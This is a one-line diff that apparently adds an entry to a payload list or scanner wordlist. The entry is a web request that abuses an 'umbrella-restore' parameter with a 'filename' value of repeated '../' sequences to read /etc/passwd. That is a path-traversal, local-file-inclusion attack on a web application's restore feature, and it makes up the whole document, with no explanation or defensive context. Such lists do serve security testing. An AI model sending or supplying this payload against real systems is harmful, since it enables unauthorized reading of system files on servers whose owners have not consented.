@@ -1,0 +1,1 @@
+/?umbrella-restore=1&filename=../../../../../../etc/passwd
